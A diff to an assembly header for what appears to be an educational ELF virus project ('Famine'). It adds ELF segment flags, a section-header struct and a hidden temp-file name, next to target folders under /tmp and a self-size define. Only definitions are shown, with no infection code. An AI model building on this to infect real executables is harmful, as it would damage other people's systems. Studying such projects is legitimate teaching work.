@@ -3,6 +3,7 @@
 
 %define FOLDER_1 "/tmp/test/"
 %define FOLDER_2 "/tmp/test2/"
+%define TMP ".mimic.famine"
 
 %define FILE_SIZE 256
 %define DIRENT 1024
@@ -11,9 +12,15 @@
 
 %define FAMINE_SIZE _end - _famine
 
-; ELF_DEFINITION
+; ELF_HDR_DEFINITION
 %define ET_EXEC 0x02
 %define ET_DYN 0x03
+
+; ELF_PHDR_DEFINITION
+%define PT_LOAD 0x1
+%define PF_X    0x1
+%define PF_W    0x2
+%define PF_R    0x4
 
 ;SYSCALL
 %define SYS_WRITE 1
@@ -102,6 +109,19 @@ struc phdr64
     .p_filesz:           resq 1
     .p_memsz:            resq 1
     .p_align:            resq 1
+endstruc
+
+struc shdr64
+    .sh_name:            resd 1
+    .sh_type:            resd 1
+    .sh_flags:           resq 1
+    .sh_addr:            resq 1
+    .sh_offset:          resq 1
+    .sh_size:            resq 1
+    .sh_link:            resd 1
+    .sh_info:            resd 1
+    .sh_addralign:       resq 1
+    .sh_entsize:         resq 1
 endstruc
 
 ; DB allocates in chunks of 1 byte.
